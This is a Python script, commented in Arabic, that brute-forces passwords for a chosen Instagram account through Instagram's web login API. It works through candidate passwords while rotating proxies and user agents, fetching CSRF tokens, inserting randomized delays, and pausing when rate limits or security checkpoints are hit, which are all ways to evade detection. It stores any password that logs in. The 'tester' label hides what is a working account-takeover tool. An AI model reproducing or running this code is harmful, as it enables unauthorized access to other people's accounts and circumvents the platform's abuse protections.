#!/usr/bin/env python3
"""
Login Tester - Multi-threaded Instagram authentication tester
"""

import requests
import random
import time
import json
import threading
from fake_useragent import UserAgent

class LoginTester:
    def __init__(self, username, proxies=None, config=None):
        self.username = username
        self.proxies = proxies or []
        self.config = config or {}
        self.attempts = 0
        self.found = False
        self.found_password = None
        self.lock = threading.Lock()
        self.session = requests.Session()
        self.ua = UserAgent()
        
        # إعدادات متقدمة
        self.device_id = self._generate_id(16)
        self.guid = self._generate_guid()
        self.ad_id = self._generate_id(32)
        
        # إعدادات التأخير
        self.delay_min = self.config.get('delay_min', 1.5)
        self.delay_max = self.config.get('delay_max', 3.5)
        self.timeout = self.config.get('timeout', 15)
    
    def _generate_id(self, length):
        import uuid
        return uuid.uuid4().hex[:length]
    
    def _generate_guid(self):
        import uuid
        return str(uuid.uuid4()).upper()
    
    def _get_headers(self, csrf_token=''):
        headers = {
            'User-Agent': self.ua.random,
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Host': 'i.instagram.com',
            'Origin': 'https://www.instagram.com',
            'Referer': 'https://www.instagram.com/',
            'x-ig-app-id': '936619743392459',
            'x-ig-www-claim': '0',
            'x-instagram-ajax': '1',
            'x-requested-with': 'XMLHttpRequest',
            'x-csrftoken': csrf_token,
        }
        return headers
    
    def _get_csrf_token(self):
        """جلب CSRF token من الكوكيز"""
        try:
            url = 'https://www.instagram.com/'
            headers = {'User-Agent': self.ua.random}
            resp = self.session.get(url, headers=headers, timeout=self.timeout)
            
            for cookie in self.session.cookies:
                if cookie.name == 'csrftoken':
                    return cookie.value
        except:
            pass
        return ''
    
    def test_password(self, password):
        """اختبار كلمة مرور واحدة"""
        if self.found:
            return False
        
        try:
            # تأخير عشوائي (سلوك بشري)
            time.sleep(random.uniform(self.delay_min, self.delay_max))
            
            # جلب CSRF token
            csrf_token = self._get_csrf_token()
            
            if not csrf_token:
                return False
            
            headers = self._get_headers(csrf_token)
            
            # تشفير كلمة المرور (محاكاة Instagram encryption)
            import hashlib
            enc_password = f"#PWD_INSTAGRAM_BROWSER:0:{int(time.time())}:{password}"
            
            # بيانات الطلب
            login_data = {
                'enc_password': enc_password,
                'username': self.username,
                'queryParams': '{}',
                'optIntoOneTap': 'false',
                'stopDeletionNonce': '',
                'trustedDeviceRecords': '{}',
            }
            
            # إرسال طلب تسجيل الدخول
            url = 'https://i.instagram.com/api/v1/web/accounts/login/ajax/'
            
            proxy = None
            if self.proxies:
                proxy = random.choice(self.proxies)
                proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
            else:
                proxy_dict = None
            
            resp = self.session.post(
                url,
                headers=headers,
                data=login_data,
                proxies=proxy_dict,
                timeout=self.timeout,
            )
            
            with self.lock:
                self.attempts += 1
            
            # تحليل النتيجة
            result = resp.json()
            
            if result.get('authenticated'):
                with self.lock:
                    self.found = True
                    self.found_password = password
                return True
            
            if result.get('status') == 'ok' and result.get('userId'):
                with self.lock:
                    self.found = True
                    self.found_password = password
                return True
            
            # تحليل رسائل الخطأ
            if 'message' in result:
                msg = result['message'].lower()
                if 'challenge' in msg or 'checkpoint' in msg or 'login_required' in msg:
                    # تم اكتشاف checkpoint - انتظر أطول
                    time.sleep(random.uniform(30, 60))
                elif 'rate' in msg or 'too many' in msg:
                    # تم تحديد السرعة - انتظر
                    time.sleep(random.uniform(60, 120))
            
            return False
            
        except Exception as e:
            return False
    
    def test_passwords_batch(self, passwords, callback=None):
        """اختبار مجموعة من كلمات المرور"""
        for password in passwords:
            if self.found:
                return
            
            success = self.test_password(password)
            
            if callback:
                callback(password, success, self.attempts)
            
            if success:
                return
